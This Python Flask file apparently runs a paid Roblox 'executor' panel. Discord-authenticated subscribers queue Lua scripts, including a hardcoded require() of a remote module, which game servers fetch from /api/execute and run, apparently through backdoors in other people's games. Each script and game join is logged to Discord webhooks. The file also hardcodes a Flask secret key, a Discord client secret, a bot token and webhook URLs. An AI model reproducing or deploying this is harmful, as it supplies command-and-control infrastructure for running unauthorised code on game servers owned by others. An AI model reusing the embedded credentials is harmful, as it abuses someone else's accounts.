from flask import Flask,request,render_template,session,url_for,redirect,abort
from flask_discord_extended import FlaskDiscord
import sqlite3,string,requests,random
from lxml import html
from contextlib import closing

app = Flask(__name__)
app.secret_key = 'p8FbRtK4oiwK0RIWYnXnTUEYpMXGyntqYmKldAM0QYbYUo71wKvxEGLbXFoWq0BsPtZr'

app.config["DISCORD_CLIENT_ID"] = "1377236194320060416"
app.config["DISCORD_CLIENT_SECRET"] = "DcT3WmB6fXyd4KL5Du-otg4Oi0Ps8Z16"
app.config["DISCORD_OAUTH"] = True
app.config["DISCORD_OAUTH_SCOPE"] = ['identify']
app.config["DISCORD_OAUTH_REDIRECT_URI"] = "http://kr.blacknuse.pro/callback"
app.config["DISCORD_AUTHORIZATION"] = "MTM3NzIzNjE5NDMyMDA2MDQxNg.GcZSTg.JpRsx3ObzffwuNzohe_w8IjkjPc8vKhaVxNSWw"

Discord = FlaskDiscord(app)

DATABASE = './db.db'

def get_db():
    return sqlite3.connect(DATABASE, check_same_thread=False)

def get_user(discord_id):
    conn = sqlite3.connect('db.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE discord_id=?', (discord_id,))
    user = cursor.fetchone()
    conn.close()
    if user:
        return {
            'roblox_name': user[0],
            'profile': user[1],
            'discord_id': user[2],
            'discord_name': user[3],
            'plan': user[4]
        }
    else:
        return None

def user_exist_in_db(user_id, cursor):
    cursor.execute("SELECT discord_id FROM users WHERE discord_id = ?", (str(user_id),))
    existing_discord = cursor.fetchone()
    return existing_discord is not None

@app.route('/',methods=['GET','POST'])
def index():
    return render_template('home.html')

@app.route('/discord-login')
def login():
    return Discord.Oauth.redirect_login()

@app.route('/callback')
def callback():
    with closing(get_db()) as conn:
        cursor = conn.cursor()
        user = Discord.Oauth.callback()
        profile = f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png?size=4096"
        if not user_exist_in_db(user['id'], cursor):
            profile = "https://discord.com/assets/c09a43a372ba81e3018c3151d4ed4773.png" if user['avatar'] == None else profile
            cursor.execute("INSERT INTO users (roblox_name, profile, discord_id, discord_name, plan) VALUES (?, ?, ?, ?, ?)",
                      ("none", str(profile), str(user['id']),str(user['username']), "none"))
            conn.commit()
        else:
            cursor.execute("SELECT profile, discord_name FROM users WHERE discord_id = ?", (user['id'],))
            result = cursor.fetchone()
            if result[1] != profile:
                cursor.execute("UPDATE users SET profile = ? WHERE discord_id = ?", (profile ,user['id']))
                if user['avatar'] == None:
                    cursor.execute("UPDATE users SET profile = ? WHERE discord_id = ?", ("https://discord.com/assets/c09a43a372ba81e3018c3151d4ed4773.png" ,user['id']))
                conn.commit()
            if result[0] != user['username']:
                cursor.execute("UPDATE users SET discord_name = ? WHERE discord_id = ?", (user['username'] ,user['id']))
                conn.commit()
        session['id'] = user['id']
    return redirect(url_for('editor'))

@app.route('/editor',methods=['GET','POST'])
def editor():
    with closing(get_db()) as conn:
        cursor = conn.cursor()
        user = get_user(session['id'])
        if 'id' not in session or not user_exist_in_db(session['id'], cursor):
            abort(403)  # Access denied
        if user['plan'] == 'none':
            return redirect('https://discord.gg/b4w68KREFy')
        
        cursor.execute("SELECT discord_name, profile, plan FROM users WHERE discord_id = ?", (session['id'],))
        user = cursor.fetchone()
        discord_name, profile, plan = user
    if request.method == 'GET':
        return render_template('editor.html', discord_name=discord_name, profile=profile, plan=plan)

@app.route('/script-hub',methods=['GET','POST'])
def script_hub():
    with closing(get_db()) as conn:
        cursor = conn.cursor()
        user = get_user(session['id'])
        if 'id' not in session or not user_exist_in_db(session['id'], cursor):
            abort(403)  # Access denied
        if user['plan'] == 'none':
            return redirect('https://discord.gg/b4w68KREFy')
        
        cursor.execute("SELECT discord_name, profile, plan FROM users WHERE discord_id = ?", (session['id'],))
        user = cursor.fetchone()
        discord_name, profile, plan = user
    if request.method == 'GET':
        return render_template('script-hub.html', discord_name=discord_name, profile=profile, plan=plan)

@app.route('/rule',methods=['GET','POST'])
def rule():
    with closing(get_db()) as conn:
        cursor = conn.cursor()
        user = get_user(session['id'])
        if 'id' not in session or not user_exist_in_db(session['id'], cursor):
            abort(403)  # Access denied
        if user['plan'] == 'none':
            return redirect('https://discord.gg/vXWQ4wZRdH')
        else:
            cursor.execute("SELECT plan FROM users WHERE discord_id = ?", (session['id'],))
            user_plan = cursor.fetchone()[0] # Assuming plan is the first column in the result
        if request.method == 'GET':
            cursor.execute("SELECT discord_name, profile, plan FROM users WHERE discord_id = ?", (session['id'],))
            user = cursor.fetchone()
            discord_name, profile, plan = user
            return render_template('rule.html', discord_name=discord_name, profile=profile, plan=plan)

@app.route('/roblox',methods=['POST'])
def roblox():
    with closing(get_db()) as conn:
        cursor = conn.cursor()
        if 'id' not in session or not user_exist_in_db(session['id'], cursor):
            abort(403)  # Access denied
    if request.method == 'POST':
        with closing(get_db()) as conn:
            cursor = conn.cursor()
            rname = request.get_json()['name']
            cursor.execute("UPDATE users SET roblox_name = ? WHERE discord_id = ?", (rname, session['id']))
            conn.commit()
        return "Success"

@app.route('/api/execute', methods=['POST'])
def execute():
    data = request.get_json()
    place_id = data.get('placeid')
    job_id = data.get('jobid')

    with closing(get_db()) as conn:
        cursor = conn.cursor()

        cursor.execute("SELECT Script FROM script WHERE PlaceId = ? AND JobId = ?", (place_id, job_id))
        record = cursor.fetchone()

        if record:
            script = record[0]
            cursor.execute("DELETE FROM script WHERE PlaceId = ? AND JobId = ? AND Script = ?", (place_id, job_id, script))
            conn.commit()
            return {"status": True, "script": script}
        else:
            return {"status": False, "script": None}

@app.route('/api/script', methods=['POST'])
def save_script():
    with closing(get_db()) as conn:
        cursor = conn.cursor()
        if 'id' not in session or not user_exist_in_db(session['id'], cursor):
            abort(403)  # Access denied
        
    with closing(get_db()) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT roblox_name,plan FROM users WHERE discord_id = ?", (session['id'],))
        data = cursor.fetchone()
        
        if data is None or data[0] == "none":
            return "로블록스 닉네임이 등록되지 않았습니다"
        
        roblox_name = data[0]
        plan = data[1]

        cursor.execute("SELECT Status, PlaceId, JobId FROM roblox WHERE Name = ?", (roblox_name,))
        data = cursor.fetchone()

        if data is None or data[0] == "offline":
            return "현재 접속한 게임이 없습니다"
        
        def replace_username(code: str, new_username: str) -> str:
            old_username = code.split("'")[1]
            new_code = code.replace(old_username, new_username)
            return new_code

        place_id, job_id = data[1], data[2]
        if request.get_json()['script'] == "r6":
            script = "require(3068366282):Fire('ROBLOXNAME')"
            script_value = replace_username(script,roblox_name)
        elif request.get_json()['script'] == "game.Players.ROBLOXNAME:LoadCharacter()":
            script_value = request.get_json()['script'].replace("ROBLOXNAME",roblox_name)
        else:
            script_value = request.get_json()['script']

        webhook_data = {
            "content": "",
            "embeds": [
                {
                "title": "스크립트 로그",
                "color": 5814783,
                "fields": [
                    {
                    "name": "ROBLOX NAME",
                    "value": roblox_name
                    },
                    {
                    "name": "SCRIPT",
                    "value": script_value,
                    },
                    {
                    "name": "PLAN",
                    "value": plan
                    }
                ]
                }
            ],
            "attachments": []
        }

        requests.post("https://discord.com/api/webhooks/1380915129394135062/DhtpACR74KIqyH0WJf3VeErSwBqWD-WTnaLS1QTq9kxOqdxbBbBPdnJa5o48PEQ8X-Aw",json=webhook_data)
        cursor.execute("INSERT INTO script (Script, PlaceId, JobId) VALUES (?, ?, ?)", (script_value, place_id, job_id))
        conn.commit()
    
    return "스크립트가 성공적으로 실행되었습니다"

@app.route('/api/join', methods=['POST'])
def api_join():
    if request.method == 'POST':
        def game_info(game_id):
            def _get_element(tree, xpath):
                elements = tree.xpath(xpath)
                return elements[0].strip() if elements else None
            
            url = f'https://www.roblox.com/games/{game_id}'
            response = requests.get(url)

            if response.status_code != 200:
                return {
                    "name": "Unknown",
                    "description": "Unable to fetch game details",
                    "players": "0",
                    "img": "https://t2.rbxcdn.com/0d499b55a8bc928003c91e739d829038",
                    "url": url
                }

            tree = html.fromstring(response.content)

            name_xpath = '//*[@id="game-detail-page"]/div[3]/div[2]/div[1]/h1/text()'
            description_xpath = '//*[@id="about"]/div[1]/div[2]/pre/text()'
            players_xpath = '//*[@id="about"]/div[1]/div[2]/ul/li[1]/p[2]/text()'
            universe_id_xpath = '//*[@id="game-detail-meta-data"]/@data-universe-id'

            universe_ids = tree.xpath(universe_id_xpath)
            if not universe_ids:
                universe_id = None
            else:
                universe_id = universe_ids[0]

            # 기본 이미지 URL
            default_img = 'https://t2.rbxcdn.com/0d499b55a8bc928003c91e739d829038'
            img = default_img

            if universe_id:
                try:
                    media_url = f'https://games.roblox.com/v2/games/{universe_id}/media'
                    response = requests.get(media_url)
                    if response.status_code == 200:
                        data = response.json()
                        if data.get('data'):
                            imageid = data['data'][0].get("imageId")
                            if imageid:
                                thumb_url = f'https://thumbnails.roblox.com/v1/assets'
                                json_data = {
                                    "assetIds": imageid,
                                    "size": "768x432",
                                    "format": "Png",
                                    "isCircular": "false",
                                }
                                response = requests.get(thumb_url, json=json_data)
                                if response.status_code == 200:
                                    thumb_data = response.json()
                                    if thumb_data.get('data'):
                                        img = thumb_data["data"][0].get("imageUrl", default_img)
                except Exception:
                    img = default_img

            name = _get_element(tree, name_xpath) or "Unknown"
            description = _get_element(tree, description_xpath) or "No description"
            players_text = _get_element(tree, players_xpath)
            players = players_text.split(" ")[0] if players_text else "0"

            return {"name": name, "description": description, "players": players, "img": img, "url": url}

        data = request.get_json()
        placeId = data['placeid']
        info_result = game_info(placeId)

        webhook_data = {
            "content": "",
            "embeds": [
                {
                    "title": info_result['name'],
                    "description": info_result['description'],
                    "color": 5814783,
                    "fields": [
                        {
                            "name": "Players",
                            "value": info_result['players'],
                            "inline": True
                        },
                        {
                            "name": "Link",
                            "value": info_result['url'],
                            "inline": True
                        }
                    ],
                    "image": {
                        "url": info_result['img']
                    }
                }
            ],
            "attachments": []
        }

        requests.post("https://discord.com/api/webhooks/1380915039564988456/wqT5pBVz3tJtcXCow5nenSQTUsY_IDZDK8ms0HAdvPo1aShapuv1TGS_gxgLwRfkakcm", json=webhook_data)

        roblox_name = data.get('name')

        with closing(get_db()) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM users WHERE roblox_name = ?", (roblox_name,))
            user_record = cursor.fetchone()

        if not user_record:
            return "Not Whitelist"

        status = data.get('status')
        place_id = data.get('placeid')
        job_id = data.get('jobid')

        with closing(get_db()) as conn:
            cursor = conn.cursor()

            cursor.execute("SELECT * FROM roblox WHERE Name = ?", (roblox_name,))
            existing_record = cursor.fetchone()

            if existing_record:
                cursor.execute("UPDATE roblox SET Status = ?, PlaceId = ?, JobId = ? WHERE Name = ?", (status, place_id, job_id, roblox_name))
            else:
                cursor.execute("INSERT INTO roblox (Name, Status, PlaceId, JobId) VALUES (?, ?, ?, ?)", (roblox_name, status, place_id, job_id))

            conn.commit()

        return "Success"
    else:
        return abort(405)


app.run(host='0.0.0.0',port="443",ssl_context='adhoc')
